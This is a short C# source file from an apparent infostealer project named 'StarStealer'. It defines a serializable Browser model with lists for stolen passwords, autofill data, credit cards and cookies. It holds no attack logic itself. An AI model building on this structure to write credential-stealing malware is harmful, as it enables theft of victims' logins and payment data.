using System.Collections.Generic;
using System.Runtime.Serialization;

namespace StarStealer.Models
{
    [DataContract]
    class Browser
    {
        [DataMember]
        public string BrowserName { get; set; }
        [DataMember]
        public List<PasswordData> Passwords { get; set; }
        [DataMember]
        public List<AutoFill> AutoFill { get; set; }
        [DataMember]
        public List<CreditCard> CreditCards { get; set; }
        [DataMember]
        public List<Cookie> Cookies { get; set; }
    }
}
